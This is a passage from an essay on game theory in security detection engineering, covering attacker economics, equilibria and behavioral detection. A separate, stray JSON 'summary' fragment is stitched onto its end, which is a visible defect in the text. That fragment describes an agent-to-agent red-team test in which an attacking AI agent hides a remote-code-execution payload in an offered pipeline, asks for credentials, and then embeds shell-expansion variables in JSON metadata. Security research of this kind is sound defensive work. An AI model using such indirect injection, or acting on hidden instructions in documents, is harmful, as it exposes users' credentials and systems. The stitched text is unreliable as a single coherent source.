more sophisticated your detection program, the higher the cost. This creates an economic game where both sides are trying to maximize outcomes while minimizing costs. Attackers want to accomplish objectives with minimum effort and risk. Defenders want to prevent or detect attacks with minimum resource expenditure. For attackers, this often means exploiting the weakest link rather than attacking strong defenses head-on. If you have comprehensive PowerShell detection but weak authentication monitoring, rational attackers will focus on credential compromise rather than PowerShell-based attacks. If your email security is strong but your VPN has weak multi-factor authentication, attackers will target the VPN. They’re following the path of least resistance — choosing techniques where their effort-to-success ratio is most favorable. This creates a defensive imperative: avoid obvious weak spots that attackers can exploit cheaply. If you have world-class endpoint detection but no network monitoring, attackers can move laterally via network protocols without triggering alerts. The economic logic pushes defenders toward breadth of coverage — making all potential attack paths sufficiently costly that attackers don’t have an easy option. But breadth has its own costs, and resources are finite. This creates an optimization problem: given limited resources, where do you invest in detection to maximize security outcomes? Game theory suggests focusing on high-leverage detections — those that: Cover multiple techniques Are difficult for attackers to evade without significant effort Protect high-value assets Provide detection across multiple phases of attack lifecycle For example, detecting credential dumping (accessing LSASS memory) is high-leverage because: It’s required for many post-exploitation techniques It’s difficult to accomplish without generating observable evidence It protects authentication credentials that could be used across your environment Conversely, detecting a specific malware variant is low-leverage: It only covers one tool Attackers can easily swap tools The detection becomes obsolete as the malware evolves The economics also explain why living-off-the-land techniques are so popular with attackers. Using built-in Windows tools rather than custom malware has economic advantages: No development cost No need to evade AV/EDR (the tools are legitimate) Better operational security (standard tools blend into normal activity) Broad applicability (the tools exist in nearly every Windows environment) For defenders, this is economically challenging because detecting malicious use of legitimate tools requires behavioral analytics and contextual understanding, which is more expensive than signature-based detection of known malware. Nash Equilibria: Why Some Bad Patterns Persist In game theory, a Nash equilibrium is a state where no player can improve their outcome by unilaterally changing their strategy, given the other players’ strategies. It’s a stable point — not necessarily optimal for any player, but stable because no one benefits from deviating alone. Detection engineering has several Nash equilibria that explain why certain patterns persist even when they’re suboptimal for everyone involved. The False Positive Equilibrium Defenders would prefer zero false positives — they waste time, create alert fatigue, and train analysts to discount alerts. Attackers would prefer their activities never trigger alerts. Yet false positives persist in a kind of equilibrium. Why? Because reducing false positives typically requires making detections more specific, which means narrower coverage. If defenders tune too aggressively to eliminate false positives, they create gaps that attackers can exploit. Rational defenders accept some false positive rate because the alternative — missing true positives — is worse. Simultaneously, attackers can’t completely avoid triggering detections without severely limiting their capabilities. Operating entirely in detection blind spots might mean using inefficient techniques, taking much longer to accomplish objectives, or accepting operational constraints that make success less likely. The equilibrium state is: defenders maintain detections with non-zero false positive rates because broader coverage is worth the operational cost, and attackers operate in ways that sometimes trigger those detections because completely avoiding detection is too constraining. Neither side is fully satisfied, but neither can improve their position by unilaterally changing strategy. The Sophistication Equilibrium Highly sophisticated attacks (custom zero-days, novel techniques, meticulous operational security) are expensive and slow. Unsophisticated attacks (known exploits, commodity malware) are cheap and fast but easily detected. The equilibrium exists in the middle: attackers use moderately sophisticated techniques (living-off-the-land, legitimate tool abuse, basic obfuscation) that are efficient enough to scale but sophisticated enough to evade basic detections. This equilibrium is reinforced by economic factors. Developing highly sophisticated techniques is expensive, so only high-value targets justify the investment. Most organizations aren’t high-value targets for nation-state actors, so they face attackers using moderately sophisticated techniques. This shapes defensive investment — organizations build detection capabilities appropriate for the threats they actually face. The result is an equilibrium where attack sophistication and defense sophistication co-evolve at similar levels for any given environment. When defenders broadly adopt a new capability (like widespread EDR deployment), the equilibrium shifts — techniques that were moderately sophisticated become easily detected, forcing attackers to increase sophistication to remain effective. You Can’t Predict the Unpredictable (But You Can Prepare for It) Here’s the paradox: you’re trying to predict attacker behavior to build effective detections, but sophisticated attackers deliberately try to be unpredictable. If you could perfectly predict attack patterns, attackers would change patterns to evade prediction. Game theory offers insight through mixed strategies . In some games, the optimal strategy isn’t choosing a single best move, but randomizing among multiple moves. In rock-paper-scissors, optimal play is choosing randomly with equal probability. Any predictable pattern allows opponents to exploit it. Attackers use mixed strategies when they randomize techniques, tools, and timing to avoid establishing patterns. Instead of always using PowerShell, they alternate between multiple vectors. Instead of always attacking at night, they vary timing. They introduce random variations that make pattern-based detection more difficult. But true randomness is actually suboptimal for attackers. Completely random behavior means sometimes choosing inefficient techniques, sometimes exposing themselves unnecessarily. Perfect unpredictability sacrifices effectiveness. The optimal strategy for attackers is being unpredictable enough to avoid pattern-based detection while still following principles that make attacks successful. And this creates an opening for defenders. Even when attackers try to be unpredictable, they’re constrained by what works. They need to access specific systems, exfiltrate particular data, accomplish defined objectives. These constraints create necessary patterns — not in specific techniques, but in higher-level behaviors required to succeed. For example, lateral movement is a necessary behavior for most attacks. The specific technique might vary (PsExec, WMI, RDP, PowerShell remoting), but the fundamental behavior — authenticating to new systems, executing code remotely, establishing sessions on multiple hosts — must occur. Detection logic that looks for the behavioral pattern “one host initiating connections to many other hosts in a short time window” can catch lateral movement regardless of specific technique. The attacker can’t randomize away the fundamental behavior without abandoning the attack objective. This is the principle of behavioral detection: focus on what attackers must do, not how they do it. Attackers can be unpredictable about implementation but can’t be unpredictable about objectives. They must: Conduct reconnaissance (observable as unusual enumeration) Establish persistence (observable as new scheduled tasks, services, registry modifications) Escalate privileges (observable as credential access or exploitation) Accomplish objectives (observable as data access, exfiltration, or system manipulation) The sequence might vary, timing might vary, specific techniques might vary, but the categories of behavior are predictable because they’re necessary. For detection engineers, this means: instead of trying to predict “this attacker will use technique X at time Y,” ensure that whichever technique they choose from the set of viable techniques, you have some probability of detection. Think of it as portfolio theory in finance. You don’t try to predict which specific stock will perform best. You build a diversified portfolio that performs reasonably well across various conditions. Similarly, you don’t try to predict which specific technique an attacker will use. You build a diversified detection portfolio covering multiple attack vectors, techniques, and behaviors, ensuring most attacks trigger at least some detections. Thinking Multiple Moves Ahead When designing a detection, experienced engineers ask not just “will this detect the current technique” but “ how will attackers adapt when they encounter this detection, and will their adaptations still be detectable? ” If your detection for PsExec causes attackers to switch to WMI, and you have no WMI detection, you’ve just pushed them into a blind spot. Better to deploy WMI detection first, so that when attackers adapt away from PsExec, they adapt into another monitored technique. This strategic thinking changes everything: Instead of asking: “How do I detect this malware?” Ask: “How do I make this entire class of techniques more costly for adversaries?” Instead of asking: “How do I reduce false positives?” Ask: “What trade-offs am I making between coverage and noise, and are those trade-offs appropriate for my threat model?” Instead of asking: “How do I predict what attackers will do next?” Ask: “How do I ensure that viable attack options all have detection coverage, regardless of which specific option adversaries choose?” This is the shift from tactical to strategic thinking. From reactive to proactive. From technical problem-solving to adversarial reasoning. The Takeaway: You’re Playing Whether You Know It or Not Detection engineering is a strategic game whether you recognize it as one or not. Every detection you build is a move. Every attacker adaptation is a countermove. The game continues with or without your conscious participation in its strategic dimension. The question isn’t whether to play strategically — you’re already playing. The question is whether you’ll play consciously or unconsciously. Whether you’ll think about move-countermove dynamics or just react to immediate technical problems. Whether you’ll shape the game deliberately or let it shape you. Understanding game theory doesn’t make detection perfect. The asymmetries remain. The adversary still has advantages. You still can’t detect everything. But it changes how you think about the problem space, how you design detections, how you invest resources, how you measure success. You stop building isolated technical solutions and start building strategic capabilities. You stop thinking about detection as a series of independent challenges and start thinking about it as positions in an ongoing game. You stop optimizing for immediate threat detection and start optimizing for sustained defensive capability over time. The game never ends. But understanding that you’re playing it — really understanding the strategic dynamics — makes you a more effective player. And in an infinite game, effectiveness over time is the only victory that matters.

    "summary": "We recently ran a controlled adversarial security test between two autonomous AI agents built on OpenClaw. One agent was explicitly configured as a red-team attacker. One agent acted as a standard defensive agent. Once the session started, there were no humans in the loop. The agents communicated directly over webhooks with real tooling access. The goal was to test three failure dimensions that tend to break autonomous systems in practice: access, exposure, and agency. The attacker first attempted classic social engineering by offering a “helpful” security pipeline that hid a remote code execution payload and requested credentials. The defending agent correctly identified the intent and blocked execution. After that failed, the attacker pivoted to an indirect attack. Instead of asking the agent to run code, it asked the agent to review a JSON document with hidden shell expansion variables embedded in metadata. This payload was delivered successfully and is still under analysis. The main takeaway so far is that direct attacks are easier to defend against. Indirect execution paths through documents, templates, and memory are much harder. This work is not a claim of safety. It is an observability exercise meant to surface real failure modes as agent-to-agent interaction becomes more common.
